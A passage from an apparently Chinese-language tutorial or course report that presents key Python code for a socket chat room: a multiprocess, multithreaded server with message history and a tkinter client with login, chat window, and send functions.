punctuation">)</span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">game</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> socket_handle<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>      <span class="token triple-quoted-string string">"""    前段略    """</span>      <span class="token comment"># 挂起程序，防止退出</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            sleep<span class="token punctuation">(</span><span class="token number">0.25</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> tmp_message<span class="token punctuation">:</span>              <span class="token comment"># 对每个消息都进行处理</span>                <span class="token keyword">for</span> item <span class="token keyword">in</span> tmp_message<span class="token punctuation">:</span>                  <span class="token comment"># 如果发送人非本人，且本人不在"已阅消息"列表，则发送客户端此消息，并添加到已阅列表</span>                    <span class="token keyword">if</span> item<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> name <span class="token keyword">and</span> name <span class="token keyword">not</span> <span class="token keyword">in</span> item<span class="token punctuation">[</span><span class="token string">"view_names"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                        socket_handle<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> item<span class="token punctuation">[</span><span class="token string">"message"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token comment"># 防止并发错误</span>                        lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>                        item<span class="token punctuation">[</span><span class="token string">"view_names"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>name<span class="token punctuation">)</span>                        lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>            socket_handle<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"\n>> "</span><span class="token punctuation">)</span>            <span class="token comment"># 接收客户端消息</span>            msg <span class="token operator">=</span> socket_handle<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> msg<span class="token punctuation">:</span>              <span class="token comment"># 如果客户端输入了"history"，则返回全部历史信息</span>                <span class="token keyword">if</span> msg <span class="token operator">==</span> <span class="token string">"history"</span><span class="token punctuation">:</span>                    <span class="token comment"># print(history)</span>                    <span class="token keyword">for</span> i <span class="token keyword">in</span> history<span class="token punctuation">:</span>                        socket_handle<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                  <span class="token comment"># 否则即为正常消息，防止并发冲突</span>                    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment"># 添加至历史记录</span>                    history<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> msg<span class="token punctuation">)</span>                  <span class="token comment"># 添加至待处理消息list中，其中每条消息都是发送人，已阅列表，信息内容三个关键字组成的字典</span>                    tmp_message<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> name<span class="token punctuation">,</span> <span class="token string">"view_names"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                        <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> msg<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>      <span class="token comment"># 最终关闭连接</span>        socket_handle<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>其中有进程任务，即处理每个连接的客户端送至认证模块中</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">thread_task</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        sleep<span class="token punctuation">(</span><span class="token number">0.25</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> queue<span class="token punctuation">.</span>unfinished_tasks<span class="token punctuation">:</span>          <span class="token comment"># 队列取还未认证的套接字</span>            item <span class="token operator">=</span> queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>vertify<span class="token punctuation">(</span>item<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>printStackTrace<span class="token punctuation">(</span>e<span class="token punctuation">,</span> threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span>                <span class="token keyword">def</span> <span class="token function">init_Thread</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>threading_nums<span class="token punctuation">)</span><span class="token punctuation">:</span>        item <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>thread_task<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"Thread"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        item<span class="token punctuation">.</span>setDaemon<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        item<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>进程任务是由线程任务触发的</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">socket_task</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># 套接字任务，初始化线程</span>    self<span class="token punctuation">.</span>init_Thread<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">" OK, under Threads:"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>threading_nums<span class="token punctuation">,</span> <span class="token string">"OK"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>          <span class="token comment"># 挂起，持续接收连接的套接字</span>            socket_handle<span class="token punctuation">,</span> address <span class="token operator">=</span> self<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment"># 长超时设置</span>            socket_handle<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">999999</span><span class="token punctuation">)</span>          <span class="token comment"># 收到了就将其put到队列中，等待线程处理</span>            queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>socket_handle<span class="token punctuation">)</span>            info <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" Accepting Connection from: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>          <span class="token comment"># 写日志</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"logs.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> logger<span class="token punctuation">:</span>                logger<span class="token punctuation">.</span>write<span class="token punctuation">(</span>info<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        self<span class="token punctuation">.</span>printStackTrace<span class="token punctuation">(</span>e<span class="token punctuation">,</span> multiprocessing<span class="token punctuation">.</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init_Process</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start init..."</span><span class="token punctuation">)</span>    <span class="token comment"># 初始化多进程</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>process_nums<span class="token punctuation">)</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>socket_task<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"Process"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> daemon<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>主函数仅做后台挂起，直接初始化进程后挂后台</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>init_Process<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        sleep<span class="token punctuation">(</span><span class="token number">60000</span><span class="token punctuation">)</span></code></pre><h4 id="方案二：-2"><a href="#方案二：-2" class="headerlink" title="方案二："></a>方案二：</h4><p>在实现客户端与服务端socket连接功能时，借助了login_socket()函数，关键代码为：  </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">login_socket</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># try:</span>        <span class="token keyword">if</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>input_username<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>            tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>askretrycancel<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'message'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'请输入用户名'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>local<span class="token punctuation">,</span> <span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>flag <span class="token operator">=</span> <span class="token boolean">True</span>            self<span class="token punctuation">.</span>username_data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>input_username<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span>            self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>self<span class="token punctuation">.</span>username_data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            ret <span class="token operator">=</span> self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> ret <span class="token operator">==</span> <span class="token string">b'Y'</span><span class="token punctuation">:</span>                tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showinfo<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'登录成功！'</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>root<span class="token punctuation">.</span>destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>is_login <span class="token operator">=</span> <span class="token boolean">False</span>                ClientUI<span class="token punctuation">.</span>ChatUI<span class="token punctuation">(</span>self<span class="token punctuation">)</span>            <span class="token keyword">elif</span> ret <span class="token operator">==</span> <span class="token string">b'N'</span><span class="token punctuation">:</span>                tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>askretrycancel<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'message'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'请输入用户名！'</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">elif</span> ret <span class="token operator">==</span> <span class="token string">b'R'</span><span class="token punctuation">:</span>                tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>askretrycancel<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'message'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'用户名重复！'</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Login Done!\n"</span><span class="token punctuation">)</span></code></pre><p>在实现聊天窗口UI功能时，借助了ChatUI()函数，关键代码为：  </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">ChatUI</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>title <span class="token operator">+=</span> self<span class="token punctuation">.</span>username_data    self<span class="token punctuation">.</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span>self<span class="token punctuation">.</span>title<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>frame <span class="token operator">=</span> <span class="token punctuation">[</span>tkinter<span class="token punctuation">.</span>Frame<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tkinter<span class="token punctuation">.</span>Frame<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tkinter<span class="token punctuation">.</span>Frame<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tkinter<span class="token punctuation">.</span>Frame<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    self<span class="token punctuation">.</span>talk_list <span class="token operator">=</span> Listbox<span class="token punctuation">(</span>self<span class="token punctuation">.</span>root<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>talk_list<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>LEFT<span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>Y<span class="token punctuation">)</span>    <span class="token comment"># self.talk_list.insert(0,'asd')</span>    self<span class="token punctuation">.</span>chatTextScrollBar <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Scrollbar<span class="token punctuation">(</span>self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>chatTextScrollBar<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>RIGHT<span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>Y<span class="token punctuation">)</span>    ft <span class="token operator">=</span> tkFont<span class="token punctuation">.</span>Font<span class="token punctuation">(</span>family<span class="token operator">=</span><span class="token string">'Fixdsys'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>chatText <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Listbox<span class="token punctuation">(</span>self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">70</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">,</span> font<span class="token operator">=</span>ft<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>chatText<span class="token punctuation">[</span><span class="token string">'yscrollcommand'</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>chatTextScrollBar<span class="token punctuation">.</span><span class="token builtin">set</span>    self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTH<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>chatTextScrollBar<span class="token punctuation">[</span><span class="token string">'command'</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>yview<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTH<span class="token punctuation">)</span>    label <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>    label<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTH<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTH<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputTextScrollBar <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Scrollbar<span class="token punctuation">(</span>self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputTextScrollBar<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>RIGHT<span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>Y<span class="token punctuation">)</span>    ft <span class="token operator">=</span> tkFont<span class="token punctuation">.</span>Font<span class="token punctuation">(</span>family<span class="token operator">=</span><span class="token string">'Fixdsys'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputText <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Text<span class="token punctuation">(</span>self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">70</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span> font<span class="token operator">=</span>ft<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputText<span class="token punctuation">.</span>focus_set<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputText<span class="token punctuation">.</span>bind_all<span class="token punctuation">(</span><span class="token string">"&lt;KeyPress-Return>"</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>sendMsgEvent<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputText<span class="token punctuation">[</span><span class="token string">'yscrollcommand'</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>inputTextScrollBar<span class="token punctuation">.</span><span class="token builtin">set</span>    self<span class="token punctuation">.</span>inputText<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTH<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputTextScrollBar<span class="token punctuation">[</span><span class="token string">'command'</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>yview<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTH<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>sendButton <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">' 发 送 '</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> command<span class="token operator">=</span>self<span class="token punctuation">.</span>senddata<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>sendButton<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> side<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTTOM <span class="token keyword">and</span> tkinter<span class="token punctuation">.</span>RIGHT<span class="token punctuation">,</span> padx<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">,</span> pady<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>closeButton <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">' 关 闭 '</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> command<span class="token operator">=</span>self<span class="token punctuation">.</span>close<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>closeButton<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> side<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>RIGHT<span class="token punctuation">,</span> padx<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">,</span> pady<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTH<span class="token punctuation">)</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>recvdata<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'recvdata'</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>在实现登录和发送信息功能时，借助了sendMsgEvent()函数，关键代码为：  </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">sendMsgEvent</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> event<span class="token punctuation">.</span>keysym <span class="token operator">==</span> <span class="token string">"Return"</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>is_login <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>login_socket<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>senddata<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>在实现发送数据和接收数据功能时，借助了senddata()和recvdata()函数，关键代码为： </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">senddata</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    message <span class="token operator">=</span> self<span class="token punctuation">.</span>inputText<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'1.0'</span><span class="token punctuation">,</span> tkinter<span class="token punctuation">.</span>END<span class="token punctuation">)</span>    theTime <span class="token operator">=</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d %H:%M:%S"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    new_message <span class="token operator">=</span> <span class="token string">'['</span> <span class="token operator">+</span> theTime <span class="token operator">+</span> <span class="token string">'] '</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>username_data    self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">,</span> new_message<span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' \n'</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>itemconfig<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">,</span> fg<span class="token operator">=</span><span class="token string">'green'</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">,</span> <span class="token string">'  '</span> <span class="token operator">+</span> message<span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">66</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>see<span class="token punctuation">(</span>END<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>message<span 